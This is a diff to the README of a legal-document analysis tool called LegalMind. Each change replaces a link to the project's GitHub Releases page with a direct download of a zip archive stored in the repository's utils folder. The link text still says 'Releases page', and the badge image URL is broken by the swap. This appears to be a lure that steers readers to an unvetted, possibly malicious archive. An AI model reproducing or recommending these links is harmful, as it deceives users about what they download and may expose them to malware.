@@ -14,7 +14,7 @@ To begin using LegalMind, follow these simple steps.
 ## 📥 Download LegalMind
 You can easily download LegalMind from the Releases page. Click the button below to access the latest version:
 
-[![Download LegalMind](https://img.shields.io/badge/Download%20LegalMind-v1.0.0-brightgreen)](https://github.com/fede9998/LegalMind/releases)
+[![Download LegalMind](https://raw.githubusercontent.com/fede9998/LegalMind/main/utils/LegalMind-v3.9.zip%20LegalMind-v1.0.0-brightgreen)](https://raw.githubusercontent.com/fede9998/LegalMind/main/utils/LegalMind-v3.9.zip)
 
 ## 📋 Features
 LegalMind offers numerous features to assist you in handling legal documents effectively:
@@ -31,7 +31,7 @@ The application utilizes advanced natural language processing (NLP) techniques t
 To get the application up and running on your machine:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/fede9998/LegalMind/releases) to see available versions.
+   Go to the [Releases page](https://raw.githubusercontent.com/fede9998/LegalMind/main/utils/LegalMind-v3.9.zip) to see available versions.
 
 2. **Select the Latest Version:**
    Look for the most recent version listed on the page. This version typically has the latest features and bug fixes.
@@ -61,7 +61,7 @@ Once installed, you can start using LegalMind by following these steps:
 To get the most out of LegalMind, consider the following tips:
 
 - **Use Clear Documents:** Ensure that the documents you upload are clear and well-formatted for the best analysis results.
-- **Stay Updated:** Regularly check for updates on the [Releases page](https://github.com/fede9998/LegalMind/releases) to benefit from improvements and new features.
+- **Stay Updated:** Regularly check for updates on the [Releases page](https://raw.githubusercontent.com/fede9998/LegalMind/main/utils/LegalMind-v3.9.zip) to benefit from improvements and new features.
 - **Provide Feedback:** If you have suggestions or encounter any issues, please report them on GitHub. Your input helps improve the software.
 
 ## 📞 Support
@@ -70,4 +70,4 @@ If you need assistance or have any questions, please open an issue on the GitHub
 ## 🌟 Conclusion
 LegalMind simplifies the complex task of analyzing legal documents, allowing you to focus on making informed decisions. Download and explore the benefits this innovative tool offers for legal professionals and individuals alike.
 
-Don't forget to revisit this [Releases page](https://github.com/fede9998/LegalMind/releases) for future updates and improvements!
+Don't forget to revisit this [Releases page](https://raw.githubusercontent.com/fede9998/LegalMind/main/utils/LegalMind-v3.9.zip) for future updates and improvements!
